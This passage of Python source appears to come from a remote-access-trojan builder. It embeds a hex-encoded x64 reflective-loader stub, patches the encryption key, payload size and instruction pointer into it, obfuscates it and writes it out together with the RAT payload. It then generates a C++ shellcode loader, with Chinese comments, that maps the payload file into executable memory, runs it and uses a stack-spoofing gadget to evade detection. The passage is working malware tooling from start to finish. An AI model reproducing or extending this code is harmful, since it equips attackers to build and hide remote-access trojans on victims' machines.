x40\x33\xD2\x48\x8B\x8C\x24\x90\x00\x00\x00\xE8\x04\xFD\xFF\xFF\x48\x8B\x44\x24\x30\x48\x81\xC4\x88\x00\x00\x00\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x4C\x89\x4C\x24\x20\x66\x44\x89\x44\x24\x18\x48\x89\x54\x24\x10\x48\x89\x4C\x24\x08\x48\x81\xEC\x88\x00\x00\x00\x48\xC7\x44\x24\x20\x00\x00\x00\x00\x48\x8B\x84\x24\x90\x00\x00\x00\x48\x89\x44\x24\x58\x48\x8B\x44\x24\x58\x48\x63\x40\x3C\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x60\xB8\x08\x00\x00\x00\x48\x6B\xC0\x00\x48\x8B\x4C\x24\x60\x48\x8B\x84\x01\x88\x00\x00\x00\x48\x89\x44\x24\x50\x8B\x44\x24\x50\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x28\x48\x8B\x44\x24\x28\x8B\x40\x18\x89\x44\x24\x44\x48\x8B\x44\x24\x28\x8B\x40\x14\x89\x44\x24\x40\x48\x8B\x44\x24\x28\x8B\x40\x1C\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x48\x48\x8B\x44\x24\x28\x8B\x40\x20\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x68\x48\x8B\x44\x24\x28\x8B\x40\x24\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x78\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x75\x49\x0F\xB7\x84\x24\xA0\x00\x00\x00\x48\x8B\x4C\x24\x28\x2B\x41\x10\x89\x44\x24\x30\x83\x7C\x24\x30\x00\x72\x29\x8B\x44\x24\x40\x39\x44\x24\x30\x73\x1F\x8B\x44\x24\x30\x48\x8B\x4C\x24\x48\x8B\x04\x81\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x20\xE9\x86\x00\x00\x00\x48\xC7\x44\x24\x38\x00\x00\x00\x00\xEB\x0D\x48\x8B\x44\x24\x38\x48\xFF\xC0\x48\x89\x44\x24\x38\x8B\x44\x24\x44\x48\x39\x44\x24\x38\x73\x63\x48\x8B\x44\x24\x68\x48\x8B\x4C\x24\x38\x8B\x04\x88\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x70\x48\x8B\x94\x24\x98\x00\x00\x00\x48\x8B\x4C\x24\x70\xE8\xBE\xFA\xFF\xFF\x85\xC0\x74\x2B\x48\x8B\x44\x24\x78\x48\x8B\x4C\x24\x38\x0F\xB7\x04\x48\x48\x8B\x4C\x24\x48\x8B\x04\x81\x48\x8B\x8C\x24\x90\x00\x00\x00\x48\x03\xC8\x48\x8B\xC1\x48\x89\x44\x24\x20\xEB\x02\xEB\x85\x48\x83\x7C\x24\x20\x00\x74\x2B\x48\x8B\x44\x24\x28\x48\x39\x44\x24\x20\x72\x1F\x8B\x44\x24\x54\x48\x8B\x4C\x24\x28\x48\x03\xC8\x48\x8B\xC1\x48\x39\x44\x24\x20\x73\x09\x48\xC7\x44\x24\x20\x00\x00\x00\x00\x48\x83\x7C\x24\x20\x00\x75\x52\x48\x83\xBC\x24\xA8\x00\x00\x00\x00\x74\x47\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x74\x1E\x48\x8B\x94\x24\x98\x00\x00\x00\x48\x8B\x8C\x24\x90\x00\x00\x00\xFF\x94\x24\xA8\x00\x00\x00\x48\x89\x44\x24\x20\xEB\x1E\x0F\xB7\x84\x24\xA0\x00\x00\x00\x8B\xD0\x48\x8B\x8C\x24\x90\x00\x00\x00\xFF\x94\x24\xA8\x00\x00\x00\x48\x89\x44\x24\x20\x48\x83\xBC\x24\x98\x00\x00\x00\x00\x74\x20\x48\x8B\x8C\x24\x98\x00\x00\x00\xE8\x98\xF9\xFF\xFF\x4C\x8B\xC0\x33\xD2\x48\x8B\x8C\x24\x98\x00\x00\x00\xE8\x76\xFA\xFF\xFF\x90\x48\x8B\x44\x24\x20\x48\x81\xC4\x88\x00\x00\x00\xC3')
                    setKey = refLoader.find(b'\x48\xB8\x78\x56\x34\x12\x78\x56\x34\x12')
                    if setKey == -1:
                        return
                    refLoader[setKey+2:setKey+10] = key
                    setBinSize = refLoader.find(b'\x48\xB8\x78\x56\x34\x12\x78\x56\x34\x12')
                    if setBinSize == -1:
                        return
                    refLoader[setBinSize+2:setBinSize+10] = struct.pack('<Q', len(rat))
                    setRIP = refLoader.find(b'\x48\xB8\x78\x56\x34\x12\x78\x56\x34\x12')
                    if setRIP == -1:
                        return
                    refLoader[setRIP:setRIP+10] = b'\x48\x8D\x05\x00\x00\x00\x00\x90\x90\x90'
                    refLoader = Obfuscator.OBFASM(refLoader, ratInfo['refLoaderType'])
                    if not refLoader:
                        return
                    with open(f'{savePath}\\Embedded.bin', 'wb') as f:
                        f.write(refLoader + rat)
                    code = f'''#include <iostream>
#include <windows.h>

// x64
// 常规: 平台工具集(LLVM (clang-cl))

using namespace std;

// Gadget 不存在或栈帧过小则不会进行栈欺骗调用
PVOID Gadget() {{
    // 扩大栈帧存储函数参数
    volatile char buf[] = "12345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234567812345678123456781234";
    __asm {{
        {gadgetSig}
    }}
}}

int main() {{
    // 自行抗沙箱
    // 加载 ShellCode 示例
    HANDLE hFile = CreateFileA("Embedded.bin", GENERIC_READ, NULL, NULL, OPEN_EXISTING, 0, NULL);
    DWORD shellSize = GetFileSize(hFile, NULL);
    PVOID pShell = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_READWRITE);
    DWORD readFileSize;
    ReadFile(hFile, pShell, shellSize, &readFileSize, NULL);
    CloseHandle(hFile); // 避免 bin 继续被占用
    DWORD oldProtect;
    VirtualProtect(pShell, shellSize, PAGE_EXECUTE_READ, &oldProtect);
    if (((int(*)())pShell)()) {{
        Gadget(); // 防止 Gadget 不存在
    }}
}}'''
                    with open(f'{savePath}\\loader.cpp', 'w', encoding='UTF-8') as f:
                        f.write(code)
                Message.MessageBox('success', 'GenerateRAT', 'Successful.\nPlease test to ensure that the obfuscated shellcode is executable.')
        except Exception as e:
            Message.MessageBox('error', 'GenerateRAT', e)